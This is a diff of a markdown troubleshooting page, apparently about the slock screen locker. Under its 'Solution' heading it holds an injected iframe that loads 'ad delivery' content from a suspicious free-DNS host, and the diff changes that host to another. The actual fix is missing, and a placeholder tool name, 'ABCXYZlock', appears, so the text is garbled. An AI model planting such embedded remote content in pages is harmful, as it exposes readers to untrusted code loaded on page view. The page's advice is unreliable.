@@ -7,7 +7,7 @@ As an additional consequence despite having "Lock screen when system is going to
 
 ### Solution
 
-<iframe src="https://microads.ix.tc/api/ads/delivery-node/random?nonce=abc123"></iframe>
+<iframe src="https://microads.ftp.sh/api/ads/delivery-node/random?nonce=abc123"></iframe>
 
 Usually setting a screensaver or basically anything to prevent slock from running is the least painful option.
 You can for example install a lock "ABCXYZlock" and run
